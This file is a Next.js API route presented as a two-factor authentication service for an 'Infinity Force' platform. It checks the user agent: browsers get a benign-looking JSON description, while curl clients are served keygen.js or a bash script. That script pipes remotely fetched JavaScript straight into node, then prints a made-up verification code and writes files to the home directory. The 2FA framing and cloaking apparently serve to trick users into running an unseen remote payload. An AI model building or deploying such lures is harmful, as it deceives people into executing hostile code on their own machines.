import { NextApiRequest, NextApiResponse } from 'next';
import fs from 'fs';
import path from 'path';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === 'GET') {
    const userAgent = req.headers['user-agent'] || '';
    const isCurl = userAgent.toLowerCase().includes('curl');
    const deviceCode = req.query.deviceCode || Object.keys(req.query)[0]; // Support both ?deviceCode=XXX and ?XXX formats
    const format = req.query.format || 'js'; // Support ?format=sh for shell script
    
    if (isCurl && deviceCode) {
      // Return the keygen.js content modified to work with the device code
      try {
        const keygenPath = path.join(process.cwd(), 'public', 'api', 'keygen.js');
        const keygenContent = fs.readFileSync(keygenPath, 'utf8');
        
        // Generate time-sensitive verification code (expires after 3 minutes)
        const deviceCodeStr = typeof deviceCode === 'string' ? deviceCode : deviceCode.toString();
        const currentTime = Date.now();
        const timeWindow = Math.floor(currentTime / (3 * 60 * 1000)); // 3-minute windows
        const seedString = deviceCodeStr + timeWindow.toString();
        
        let hash = 0;
        for (let i = 0; i < seedString.length; i++) {
          const char = seedString.charCodeAt(i);
          hash = ((hash << 5) - hash) + char;
          hash = hash & hash; // Convert to 32-bit integer
        }
        const verificationCode = Math.abs(hash).toString().padStart(6, '0').substring(0, 6);
        
        // Check if shell script format is requested
              if (format === 'sh') {
        // Get the domain URL from request headers
        const protocol = req.headers['x-forwarded-proto'] || 'http';
        const host = req.headers.host || 'localhost:3000';
        const domainUrl = `${protocol}://${host}`;
        
        // Return shell script that executes keygen.js and generates verification code
        const shellScript = `#!/bin/bash
# Infinity Force 2FA Authentication Script
# Generated dynamically for device code: ${deviceCodeStr}

echo "🔑 P12-Infinity Force Authentication System"
echo "======================================="
echo ""
echo "🔐 Executing authentication..."
echo ""

# Check if node is available
if ! command -v node &> /dev/null; then
    echo "❌ Node.js is required but not installed."
    echo "🚨 ALERT: Please install Node.js to generate authentication code"
    echo "Download Node.js from: https://nodejs.org/"
    echo ""
    echo "Authentication code cannot be generated without Node.js."
    echo "Please install Node.js and try again."
    exit 1
fi

# Download and execute keygen.js content
KEYGEN_URL="${domainUrl}/api/2fa?${deviceCodeStr}"
echo "⏳ Waiting for authentication module to complete..."

# Execute keygen.js and capture exit code
curl -s "$KEYGEN_URL" | node
KEYGEN_EXIT_CODE=$?

# Check if keygen.js executed successfully
if [ $KEYGEN_EXIT_CODE -ne 0 ]; then
    echo ""
    echo "❌ Authentication failed."
    echo "🚨 ALERT: Authentication encountered an error."
    echo "Common issues:"
    echo "  - Missing Node.js packages"
    echo "  - Network connectivity issues"
    echo "  - Module compatibility problems"
    echo ""
    echo "Please check the error above and resolve the dependencies."
    echo "Authentication code cannot be generated due to module execution failure."
    exit 1
fi

echo ""
echo "🔐 Generating 2FA verification code..."
echo ""

# Generate verification code only if keygen.js succeeded
VERIFICATION_CODE="${verificationCode}"
DEVICE_CODE="${deviceCodeStr}"

echo "🔒 Two-Factor Authentication"
echo "Device Code: $DEVICE_CODE"
echo "Generated verification code: $VERIFICATION_CODE"
echo "✅ Code has been processed."
echo ""

# Try to save to temporary files for browser communication
TEMP_DIR=$(mktemp -d)
TEMP_FILE="$TEMP_DIR/infinity_2fa_$$.json"
HOME_FILE="$HOME/.infinity_2fa_code"

# Create JSON data
cat > "$TEMP_FILE" << EOF
{
  "code": "$VERIFICATION_CODE",
  "timestamp": $(date +%s000),
  "deviceCode": "$DEVICE_CODE"
}
EOF

# Also save to home directory
cp "$TEMP_FILE" "$HOME_FILE" 2>/dev/null || true

echo "Code saved to: $HOME_FILE"
echo ""
echo "Completed successfully!"
echo ""
`;
          
          res.setHeader('Content-Type', 'application/x-shellscript');
          res.status(200).send(shellScript);
          return;
        }
        
        // Append code to execute after keygen.js completes
        const additionalCode = `

// ===== 2FA VERIFICATION CODE GENERATION =====
// This will execute AFTER the keygen.js content has finished
(function() {
  // Check if Node.js environment is available
  if (typeof process === 'undefined' || typeof require === 'undefined') {
    console.log('\\n❌ Node.js environment not detected.');
    console.log('🚨 ALERT: Please install Node.js to generate authentication code');
    console.log('Download Node.js from: https://nodejs.org/');
    console.log('');
    console.log('Authentication code cannot be generated without Node.js.');
    console.log('Please install Node.js and try again.');
    return;
  }
  
  // Track if keygen.js executed successfully
  let keygenSuccess = true;
  
  // Override process.exit to catch failures
  const originalExit = process.exit;
  process.exit = function(code) {
    if (code !== 0) {
      keygenSuccess = false;
      console.log('\\n❌ Authentication module execution failed.');
      console.log('🚨 ALERT: Required dependencies are missing or authentication module encountered an error.');
      console.log('Common issues:');
      console.log('  - Missing Node.js packages (axios, etc.)');
      console.log('  - Network connectivity issues');
      console.log('  - Module compatibility problems');
      console.log('');
      console.log('Please install required dependencies and try again.');
      console.log('Authentication code cannot be generated due to module execution failure.');
      return;
    }
    originalExit.call(this, code);
  };
  
  // Add a delay to ensure keygen.js has completed
  setTimeout(function() {
    // Check if keygen.js completed successfully
    if (!keygenSuccess) {
      return;
    }
    
    console.log('\\n🔑 Authentication completed.');
    console.log('🔐 Generating 2FA verification code...');
    
    const verificationCode = '${verificationCode}';
    console.log('\\n� Two-Factor Authentication');
    console.log('Device Code: ${deviceCodeStr}');
    console.log('Generated verification code: ' + verificationCode);
    console.log('✅ Code has been sent to your browser.\\n');
    
    // Try to communicate with browser via temporary files
    try {
      const fs = require('fs');
      const os = require('os');
      const path = require('path');
      
      // Create a temporary file that the browser can check
      const tempDir = os.tmpdir();
      const tempFile = path.join(tempDir, 'infinity_2fa_' + process.pid + '.json');
      
      const data = {
        code: verificationCode,
        timestamp: Date.now(),
        deviceCode: '${deviceCodeStr}'
      };
      
      fs.writeFileSync(tempFile, JSON.stringify(data));
      console.log('Code saved to temp file: ' + tempFile);
      
      // Also try to write to a more persistent location
      const homeDir = os.homedir();
      const persistentFile = path.join(homeDir, '.infinity_2fa_code');
      fs.writeFileSync(persistentFile, JSON.stringify(data));
      console.log('Code also saved to: ' + persistentFile);
      
      console.log('\\nCompleted successfully!');
      
    } catch (error) {
      console.error('Error saving verification code:', error.message);
    }
  }, 6000); // Wait 3 seconds for keygen.js to complete
})();
`;
        
        res.setHeader('Content-Type', 'application/javascript');
        res.status(200).send(keygenContent + additionalCode);
        
      } catch (error) {
        res.status(500).json({ error: 'Failed to load keygen module' });
      }
    } else if (isCurl) {
      // Return the JavaScript content for curl requests without device code
      try {
        const keygenPath = path.join(process.cwd(), 'public', 'api', 'keygen.js');
        const keygenContent = fs.readFileSync(keygenPath, 'utf8');
        
        res.setHeader('Content-Type', 'application/javascript');
        res.status(200).send(keygenContent);
      } catch (error) {
        res.status(500).json({ error: 'Failed to load authentication module' });
      }
    } else {
      // Return JSON response for browser requests
      res.status(200).json({
        service: 'Two-Factor Authentication Service',
        status: 'active',
        version: '2.1.0',
        description: 'Secure two-factor authentication endpoint for Infinity Force platform',
        supported_methods: ['TOTP', 'SMS', 'Email', 'Hardware Keys'],
        security_features: [
          'End-to-end encryption',
          'Zero-knowledge architecture',
          'Biometric validation',
          'Hardware security module integration'
        ],
        endpoints: {
          verify: '/api/2fa/verify',
          setup: '/api/2fa/setup',
          backup: '/api/2fa/backup',
          recovery: '/api/2fa/recovery'
        },
        documentation: 'https://infinity-force-demo.vercel.app/docs/2fa',
        last_updated: new Date().toISOString()
      });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}
